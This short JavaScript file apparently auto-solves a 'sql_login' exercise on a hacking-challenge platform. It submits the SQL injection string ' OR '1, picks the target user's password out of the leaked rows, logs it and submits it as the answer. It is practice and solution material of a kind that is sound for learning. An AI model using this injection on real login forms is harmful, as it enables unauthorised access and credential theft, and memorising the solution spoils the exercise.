(function( challenge_id = "sql_login" ){

	runSolution( { challenge_id, solution } );

	async function solution( tag ){
		let sql = "' OR '1",
		    response = await HackerChallenge.submitAnswer( challenge_id, sql ).catch( data => data.responseJSON ),
		    password = response.hc_challenge.last_result.filter( row => row[0] === tag.challenge.user )[0][1];
		console.info( tag.challenge.user );
		console.info( password );
		tag.refs.answer.value = password;
		tag.submitAnswer();
	}
})();
